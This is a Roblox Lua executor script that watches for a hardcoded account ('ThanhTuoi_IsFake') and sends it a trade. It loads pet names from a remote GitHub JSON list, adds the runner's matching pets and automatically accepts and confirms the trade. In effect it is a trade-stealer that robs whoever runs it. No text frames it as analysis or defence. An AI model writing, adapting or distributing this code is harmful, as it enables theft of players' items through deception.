repeat task.wait() until game:IsLoaded()
wait(10)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local AddItem = ReplicatedStorage.GameEvents.TradeEvents.AddItem
local Accept = ReplicatedStorage.GameEvents.TradeEvents.Accept
local Confirm = ReplicatedStorage.GameEvents.TradeEvents.Confirm
local SendRequest = ReplicatedStorage.GameEvents.TradeEvents.SendRequest
local TradingUI = Players.LocalPlayer.PlayerGui.TradingUI
local playerNameToCheck = "ThanhTuoi_IsFake"

local http_request = http_request or request or (syn and syn.request) or (http and http.request)

function additemFromWeb()
	local url = "https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/listpet1.json"
	local response = http_request({ Url = url, Method = "GET" })
	if response and response.Body then
		local success, listpet = pcall(function()
			return game:GetService("HttpService"):JSONDecode(response.Body)
		end)
		if success then
			return listpet
		else
			print("Lỗi khi phân tích dữ liệu JSON")
		end
	else
		print("Không thể tải dữ liệu từ URL")
	end
end

function equipticket()
	for _, tool in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
		if string.find(string.lower(tool.Name), string.lower("Trading Ticket")) then
			Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
			print("Đã trang bị:", tool.Name)
			break
		end
	end
end

function getplayer()
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= Players.LocalPlayer and player.Name == playerNameToCheck then
			return player
		end
	end
	return false
end

function additem(listpet)
	for _, v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
		for _, petName in ipairs(listpet) do
			if string.find(v.Name, petName) then
				local uuid = v:GetAttribute("PET_UUID")
				AddItem:FireServer("Pet", uuid)
			end
		end
	end
end

while wait(2) do
	pcall(function()
		if TradingUI.Enabled then
			additem(additemFromWeb())
			if TradingUI.Main.Main.AcceptButton.Main.TextLabel.Text == "Accept" then
				Accept:FireServer()
			end
			if TradingUI.Main.Main.AcceptButton.Main.TextLabel.Text == "Confirm" then
				Confirm:FireServer()
			end
		else
			local playerFound = getplayer()
			print(playerFound)
			if playerFound ~= false then
				equipticket()
				SendRequest:FireServer(playerFound)
				additem(additemFromWeb())
				wait(1)
				Accept:FireServer()
				wait(1)
				Confirm:FireServer()
			else
				wait(10)
			end
		end
	end)
end
